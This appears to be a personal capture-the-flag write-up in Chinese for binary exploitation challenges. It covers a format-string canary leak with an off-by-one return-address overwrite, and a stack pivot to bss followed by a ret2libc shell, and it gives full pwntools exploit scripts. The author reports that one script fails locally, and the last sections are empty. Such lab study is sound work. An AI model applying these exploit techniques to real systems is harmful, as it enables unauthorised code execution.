## ez_fmt

![[Pasted image 20241216215452.png]]

![[Pasted image 20241216215543.png]]

输入aaaaaaaa的偏移是10

![[Pasted image 20241216215629.png]]

![[Pasted image 20241216215641.png]]

注意这里的read_str的输入是溢出9个字节，如果不注意就会认为是8个字节。这样的话就可以打off by one的手法，用一个字节的溢出去修改返回地址。
![[Pasted image 20241216215653.png]]

这还有个后门函数
![[Pasted image 20241216221007.png]]

主函数里面存在格式化字符串，可以泄露canary的地址
思路：首先使用格式化泄露canary然后再溢出修改返回会地址的最后一个字节为vuln的函数的最后一个字节，因为ret的返回地址和vuln的地址只有最后一个字节的不同，也就是15的偏移地址，13是canary，14是rbp，15就是返回地址的东西，可以看到vuln函数的地址，就差一个字节，用off by one就行，修改完后就可以循环vuln函数了，然后就是利用格式化字符串修改返回地址的0x4013ec中的13改成12就行，这因为后门函数是0x4012xx的形式的，然后我们就可以再次利用下面的off by one修改最后一个字节为后门的字节就可以打通了。
![[Pasted image 20241216220503.png]]

![[Pasted image 20241216220626.png]]

下面我讲解一下代码：
就暂且讲解下面的代码，首先ret的地址是rbp减去0x18的位置，如下图rbp第二个地址到rbp+8的距离，这里是借用的图，距离并不是0x18，所以ret的地址就这样的出来了，然后我们还知道我们只需要修改ret的中间的一个字节，所以ret加一，然后就是我们将p64(ret+1)放在栈上的原因是因为我们可以根据rbp的偏移计算出我们的p64(ret+1)的偏移地址，得出是6，这样我们在第一步就将返回地址准备好了，同时也将后面的一个字节改了，然后就是进行格式化定位修改修改中间的字节，修改完之后就差最后的一个字节，我们就利用最后的off by one修改。

![[Pasted image 20241216222410.png]]
![[Pasted image 20241216222726.png]]

==疑惑：我在想如果我不将p64(ret+1)拿出来放在栈上，而是直接15的偏移直接定位到ret+1的地址去修改中位不也行吗？直接修改两个字节，或者修改中间的一个字节最后再用offbyone去修改最后的，但是我没有打通。。。。。！！！！有点疑惑，浪费了我很多时间，还有就是第一个为什么用send？我用sendline就打不通。也是很疑惑，难道换行符会占用了什么空间导致的吗？==


已解疑惑：我在刚写完疑惑的时候就想起来如果要通过格式化字符串修改栈上的时候需要一个多级链表，我才发现15的偏移的链表就只有上图所示的一个，所以不行，我才想来这是我之前写格式化字符串的时候的总结了。但是为什么不能用sendline我还是不知道。


```
from pwn import *

filename = './fmt'

context.terminal = ['tmux', 'splitw', '-h']

debug = 0

if debug:

    io = remote('nc1.ctfplus.cn', 22626)

else:

    io = process(filename)

  

elf = ELF(filename)

context(arch = elf.arch, log_level = 'debug', os = 'linux')

  

def dbg():

    gdb.attach(io)

io.send('A')

sleep(0.1)

io.send('%13$p%14$p')

sleep(0.1)

io.recvuntil('0x')

canary = int(io.recv(16), 16)

success('canary =>> ' + hex(canary))

  

io.recvuntil('0x')

rbp = int(io.recv(12), 16)

success('rbp =>> ' + hex(rbp))

ret = rbp - 0x18
io.send(p64(ret+1)+b'A' *48+ p64(canary) + p64(rbp)+ b'\xec')
sleep(0.1)

io.send(b'%18c%6$hhn')
sleep(0.1)
# attach(io)
io.sendline(b'A' * 0x38 + p64(canary) + p64(rbp)+ b'\x82')


io.interactive()
```


## stackpoive

==这一题和2024羊城杯的一个栈迁移的题一样，但是代码拿过来打不通，并且我对上次的题的理解不对的地方也加以改正==。

![[Pasted image 20241222155052.png]]

![[Pasted image 20241222155116.png]]

![[Pasted image 20241222155126.png]]

可以看到函数很简单，没有什么套路。我们输入1后就进入到了vuln函数，这里面存在一个栈溢出函数，溢出的是0x10字节，正好到返回地址，但是函数只有一个溢出函数，并且不存在循环多次使用函数，溢出的距离也不够我们先泄露真实地址再跳转回read函数。我们需要进行栈迁移到bss段，具体解析如下：

---
让我们解释一下第一次发送的read，我们将bss设置为bss=0x601130是因为我们read的输入的地方是bss=rbp-0x30的地方，也就是说我们需要减去0x30，所以我们就提前加上了0x30，现在我们需要将rbp设置为bss就行，然后返回地址我们就填read函数地址就行。这样我们退出read的时候会紧接着退出vuln就会触发leave;ret。也就会帮我们进行rbp,rsp,ret的跳转。
![[Pasted image 20241222163805.png]]
![[Pasted image 20241222161538.png]]
![[Pasted image 20241222161817.png]]

---
对于第二次发送我需要纠正之前我的认知错误，==这里我们发现为什么我们需要最后进行将rbp=bss-0x38是因为我们需要将rsp调到bss的开头，也就是0x601100的地方，有人可能就会问了bss-0x38不是0x601108吗？现在我就详细讲一点关于栈迁移的一个小点：mov rsp,rbp  pop rbp; pop eip;这一步中rsp会跳到rbp的位置，pop rbp后，rsp会再往下跳一个地址位，所以我们要多减去一个0x8字节！！！==这样我们就可以将程序的执行流程调成从第二次read的输入的内容的地址开始处执行程序。执行完leave后就会接着输入第三次read的输入。

![[Pasted image 20241222164340.png]]

---
对于第三次输入的地方我就谁一点就是，rbp=bss-0x40-0x38的原因是我们跳到第三次read函数的输入的起始地址。

![[Pasted image 20241222170051.png]]

---

对于这一题我们本地打不通，也不知道哪里出了问题。。。。。。。
有机会想到了原因再回来重新研判吧。



```
#coding:utf-8
from pwn import*
p=process("./main")
elf=ELF("./main")
libc=ELF("./libc.so.6")
put_plt=elf.plt["puts"]
put_got=elf.got["puts"]
bss=0x601130
read_a=0x000000000040071c

def bug(x):
    if x :
        attach(p)

p.sendlineafter('>>\n', '1')

bss=0x601130
p.sendafter('something\n', b'A' * 0x30 + p64(bss) + p64(read_a))

pop_rdi=0x0000000000400853
leave=0x0000000000400738
pop_rbp=0x0000000000400628

  

def func2(x):

    pay=p64(pop_rdi)+p64(put_got)+p64(put_plt)

    pay+=p64(pop_rbp)+p64(bss+0x40)+p64(read_a)

    pay+=p64(bss-0x38)+p64(leave)

    p.send(pay)

func2(1)

puts_real=u64(p.recvuntil(b'\x7f')[-6:].ljust(8,b'\x00'))
libc_base=puts_real-libc.sym['puts']
system_real=libc_base+libc.sym['system']
binsh=libc_base+libc.search('/bin/sh\x00').__next__()

  
payload3=(p64(pop_rdi)+p64(binsh)+p64(system_real)).ljust(0x30,b'\x00')
payload3+=p64(bss+0x40-0x38)+p64(leave)
p.send(payload3)

p.interactive()
```

## 0000


![[Pasted image 20241226211638.png]]


## ez_overflow


## monkey